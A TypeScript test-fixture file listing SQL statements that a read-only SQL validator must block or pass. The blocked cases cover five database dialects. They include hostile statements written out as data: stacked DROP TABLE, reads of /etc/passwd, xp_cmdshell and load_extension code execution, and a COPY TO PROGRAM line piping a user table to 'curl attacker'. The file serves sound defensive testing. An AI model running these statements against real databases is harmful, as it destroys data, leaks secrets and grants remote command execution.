/**
 * Adversarial safety cases (RT-F1) — the acceptance gate for the SQL validator.
 * Shared by the vitest suite (CI) and scripts/verify-safety-adversarial.ts (manual).
 * Every MUST_BLOCK statement is a real attack shape: writes/DDL, stacked
 * statements, data-modifying CTEs, read-only reversal, and per-dialect
 * side-effecting SELECT-legal functions. MUST_PASS measures the parser
 * false-positive rate on legitimate SELECTs.
 */
import type { Dialect } from '../connection-providers/provider-interface';

export type AdversarialCase = { sql: string; dialect: Dialect; expect: 'blocked' | 'ok'; label: string };

export const MUST_BLOCK: AdversarialCase[] = [
  // Writes / DDL (all dialects)
  { sql: "INSERT INTO users VALUES (1,'x')", dialect: 'postgres', expect: 'blocked', label: 'INSERT' },
  { sql: 'UPDATE users SET admin=true', dialect: 'mysql', expect: 'blocked', label: 'UPDATE' },
  { sql: 'DELETE FROM books', dialect: 'sqlite', expect: 'blocked', label: 'DELETE' },
  { sql: 'DROP TABLE users', dialect: 'postgres', expect: 'blocked', label: 'DROP' },
  { sql: 'TRUNCATE users', dialect: 'postgres', expect: 'blocked', label: 'TRUNCATE' },
  { sql: 'ALTER TABLE users ADD COLUMN x int', dialect: 'mysql', expect: 'blocked', label: 'ALTER' },
  // Stacked statements
  { sql: 'SELECT 1; DROP TABLE users', dialect: 'postgres', expect: 'blocked', label: 'stacked ;DROP' },
  { sql: 'SELECT 1; DELETE FROM books', dialect: 'sqlite', expect: 'blocked', label: 'stacked ;DELETE' },
  // Comment-tricked write
  { sql: 'SELECT 1 /* x */; DROP TABLE t', dialect: 'postgres', expect: 'blocked', label: 'comment + stacked' },
  // Data-modifying CTE — parses as top-level SELECT but writes on PG (code-review C1)
  { sql: "WITH x AS (INSERT INTO books (title) VALUES ('h') RETURNING *) SELECT * FROM x", dialect: 'postgres', expect: 'blocked', label: 'CTE INSERT bypass' },
  { sql: "WITH x AS (UPDATE books SET title='h' RETURNING id) SELECT * FROM x", dialect: 'postgres', expect: 'blocked', label: 'CTE UPDATE bypass' },
  { sql: 'WITH x AS (DELETE FROM books RETURNING id) SELECT * FROM x', dialect: 'postgres', expect: 'blocked', label: 'CTE DELETE bypass' },
  { sql: 'WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x', dialect: 'mysql', expect: 'blocked', label: 'CTE INSERT (mysql)' },
  // Read-only transaction reversal (RT-F2)
  { sql: 'SET TRANSACTION READ WRITE', dialect: 'postgres', expect: 'blocked', label: 'SET TX READ WRITE' },
  { sql: 'SET default_transaction_read_only = off', dialect: 'postgres', expect: 'blocked', label: 'SET readonly off' },
  // PG side-effecting SELECT-legal functions (RT-F1)
  { sql: 'SELECT pg_terminate_backend(123)', dialect: 'postgres', expect: 'blocked', label: 'pg_terminate_backend' },
  { sql: 'SELECT pg_sleep(300)', dialect: 'postgres', expect: 'blocked', label: 'pg_sleep DoS' },
  { sql: "SELECT pg_read_file('/etc/passwd')", dialect: 'postgres', expect: 'blocked', label: 'pg_read_file exfil' },
  { sql: "SELECT lo_export(1, '/tmp/x')", dialect: 'postgres', expect: 'blocked', label: 'lo_export' },
  { sql: "COPY (SELECT * FROM users) TO PROGRAM 'curl attacker'", dialect: 'postgres', expect: 'blocked', label: 'COPY TO PROGRAM RCE' },
  { sql: "SELECT dblink_exec('...','DELETE FROM t')", dialect: 'postgres', expect: 'blocked', label: 'dblink_exec' },
  // MySQL exfil/DoS
  { sql: "SELECT * FROM users INTO OUTFILE '/tmp/dump'", dialect: 'mysql', expect: 'blocked', label: 'INTO OUTFILE' },
  { sql: "SELECT LOAD_FILE('/etc/passwd')", dialect: 'mysql', expect: 'blocked', label: 'LOAD_FILE' },
  { sql: 'SELECT SLEEP(300)', dialect: 'mysql', expect: 'blocked', label: 'MySQL SLEEP' },
  { sql: "SELECT BENCHMARK(100000000, MD5('x'))", dialect: 'mysql', expect: 'blocked', label: 'BENCHMARK DoS' },
  // SQLite RCE/exfil
  { sql: "SELECT load_extension('evil.so')", dialect: 'sqlite', expect: 'blocked', label: 'load_extension RCE' },
  { sql: "SELECT readfile('/etc/passwd')", dialect: 'sqlite', expect: 'blocked', label: 'readfile exfil' },
  { sql: "ATTACH DATABASE '/etc/passwd' AS x", dialect: 'sqlite', expect: 'blocked', label: 'ATTACH DATABASE' },
  { sql: 'PRAGMA writable_schema = ON', dialect: 'sqlite', expect: 'blocked', label: 'PRAGMA write' },
  // SQL Server / T-SQL
  { sql: "EXEC xp_cmdshell 'dir'", dialect: 'mssql', expect: 'blocked', label: 'xp_cmdshell RCE' },
  { sql: "EXEC('SELECT 1')", dialect: 'mssql', expect: 'blocked', label: 'EXEC string dynamic SQL' },
  { sql: "EXEC sp_executesql N'SELECT 1'", dialect: 'mssql', expect: 'blocked', label: 'sp_executesql' },
  { sql: "SELECT * FROM OPENROWSET('SQLNCLI','...','SELECT * FROM t')", dialect: 'mssql', expect: 'blocked', label: 'OPENROWSET' },
  { sql: "SELECT * FROM OPENQUERY(srv, 'SELECT 1')", dialect: 'mssql', expect: 'blocked', label: 'OPENQUERY' },
  { sql: 'SELECT * INTO evil FROM users', dialect: 'mssql', expect: 'blocked', label: 'SELECT INTO (write)' },
  { sql: "WAITFOR DELAY '00:00:30'", dialect: 'mssql', expect: 'blocked', label: 'WAITFOR DELAY DoS' },
  { sql: "BULK INSERT t FROM 'c:\\x.txt'", dialect: 'mssql', expect: 'blocked', label: 'BULK INSERT file read' },
  { sql: "EXEC xp_regread 'HKEY_LOCAL_MACHINE','x','y'", dialect: 'mssql', expect: 'blocked', label: 'xp_regread' },
  { sql: "EXEC sp_configure 'show advanced options', 1", dialect: 'mssql', expect: 'blocked', label: 'sp_configure' },
  { sql: 'SELECT * FROM linkedsrv.corp.dbo.secrets', dialect: 'mssql', expect: 'blocked', label: 'linked-server 4-part name' },
  { sql: 'SELECT * FROM [lnk].corp.dbo.secrets', dialect: 'mssql', expect: 'blocked', label: 'linked-server 4-part (bracketed)' },
  { sql: 'SELECT * FROM srv . corp . dbo . secrets', dialect: 'mssql', expect: 'blocked', label: 'linked-server 4-part (spaced)' },
  { sql: 'MERGE t USING s ON t.id=s.id WHEN MATCHED THEN UPDATE SET t.x=1', dialect: 'mssql', expect: 'blocked', label: 'MERGE (write)' },
  { sql: 'SELECT 1; DROP TABLE users', dialect: 'mssql', expect: 'blocked', label: 'stacked ;DROP (mssql)' },
  { sql: 'UPDATE users SET admin=1', dialect: 'mssql', expect: 'blocked', label: 'UPDATE (mssql)' },
  // DuckDB file connections — denylist is defense-in-depth behind the engine
  // filesystem lock, but these obvious file/extension/config forms are blocked at
  // the AST/denylist screen too. (A replacement scan `FROM '/path'` is NOT
  // catchable here — that's precisely what the engine lock in the provider stops.)
  { sql: "SELECT * FROM read_csv_auto('/etc/passwd')", dialect: 'duckdb', expect: 'blocked', label: 'read_csv exfil (duckdb)' },
  { sql: "SELECT * FROM read_text('/etc/passwd')", dialect: 'duckdb', expect: 'blocked', label: 'read_text exfil (duckdb)' },
  { sql: "SELECT * FROM read_parquet('/secret.parquet')", dialect: 'duckdb', expect: 'blocked', label: 'read_parquet exfil (duckdb)' },
  { sql: "INSTALL httpfs", dialect: 'duckdb', expect: 'blocked', label: 'INSTALL extension (duckdb)' },
  { sql: "LOAD httpfs", dialect: 'duckdb', expect: 'blocked', label: 'LOAD extension (duckdb)' },
  { sql: "ATTACH 'other.db' AS x", dialect: 'duckdb', expect: 'blocked', label: 'ATTACH (duckdb)' },
  { sql: "COPY orders TO '/tmp/out.csv'", dialect: 'duckdb', expect: 'blocked', label: 'COPY TO write (duckdb)' },
  { sql: "SET enable_external_access = true", dialect: 'duckdb', expect: 'blocked', label: 'SET config (duckdb)' },
  { sql: "PRAGMA database_list", dialect: 'duckdb', expect: 'blocked', label: 'PRAGMA (duckdb)' },
  { sql: "EXPORT DATABASE '/tmp/dump'", dialect: 'duckdb', expect: 'blocked', label: 'EXPORT DATABASE (duckdb)' },
];

export const MUST_PASS: AdversarialCase[] = [
  { sql: 'SELECT COUNT(*) FROM books', dialect: 'sqlite', expect: 'ok', label: 'simple count' },
  { sql: 'SELECT title, price FROM books WHERE year > 2000 ORDER BY price DESC LIMIT 10', dialect: 'sqlite', expect: 'ok', label: 'select with limit' },
  { sql: 'SELECT b.title, c.name FROM books b JOIN book_categories bc ON b.id=bc.book_id JOIN categories c ON c.id=bc.category_id', dialect: 'sqlite', expect: 'ok', label: 'multi-join' },
  { sql: 'SELECT category_id, COUNT(*) FROM book_categories GROUP BY category_id HAVING COUNT(*) > 5', dialect: 'postgres', expect: 'ok', label: 'group by having' },
  { sql: 'WITH recent AS (SELECT * FROM books WHERE year > 2010) SELECT COUNT(*) FROM recent', dialect: 'postgres', expect: 'ok', label: 'CTE select' },
  { sql: 'WITH a AS (SELECT id FROM books), b AS (SELECT id FROM categories) SELECT COUNT(*) FROM a JOIN b USING(id)', dialect: 'postgres', expect: 'ok', label: 'multi-CTE select' },
  { sql: 'SELECT DISTINCT author FROM books', dialect: 'mysql', expect: 'ok', label: 'distinct' },
  { sql: "SELECT name FROM categories WHERE name LIKE '%Khoa%'", dialect: 'sqlite', expect: 'ok', label: 'vietnamese LIKE' },
  // SQL Server / T-SQL legitimate SELECTs (false-positive check)
  { sql: 'SELECT TOP 10 id, name FROM users', dialect: 'mssql', expect: 'ok', label: 'TOP n' },
  { sql: 'SELECT [id], [full name] FROM [my table]', dialect: 'mssql', expect: 'ok', label: 'bracket idents' },
  { sql: 'SELECT id FROM t ORDER BY id OFFSET 0 ROWS FETCH NEXT 10 ROWS ONLY', dialect: 'mssql', expect: 'ok', label: 'OFFSET/FETCH' },
  { sql: 'WITH c AS (SELECT id FROM t) SELECT * FROM c', dialect: 'mssql', expect: 'ok', label: 'CTE select (mssql)' },
  { sql: 'SELECT category, COUNT(*) FROM orders GROUP BY category', dialect: 'mssql', expect: 'ok', label: 'group by (mssql)' },
  { sql: 'SELECT a.x FROM a JOIN b ON a.id = b.id', dialect: 'mssql', expect: 'ok', label: 'join (mssql)' },
  // English words inside string literals must NOT trip the denylist (false-positive guard).
  { sql: "SELECT id FROM notes WHERE body LIKE '%execute the report%'", dialect: 'mssql', expect: 'ok', label: 'exec inside literal (mssql)' },
  { sql: "SELECT id FROM logs WHERE msg = 'sleep study results'", dialect: 'mysql', expect: 'ok', label: 'sleep inside literal (mysql)' },
  // DuckDB legitimate SELECTs over ingested tables (false-positive guard).
  { sql: 'SELECT status, COUNT(*) FROM orders GROUP BY status', dialect: 'duckdb', expect: 'ok', label: 'group by (duckdb)' },
  { sql: 'SELECT o.id, c.name FROM orders o JOIN customers c ON o.id = c.id', dialect: 'duckdb', expect: 'ok', label: 'join (duckdb)' },
  { sql: 'WITH r AS (SELECT * FROM orders WHERE amount > 10) SELECT COUNT(*) FROM r', dialect: 'duckdb', expect: 'ok', label: 'CTE select (duckdb)' },
];
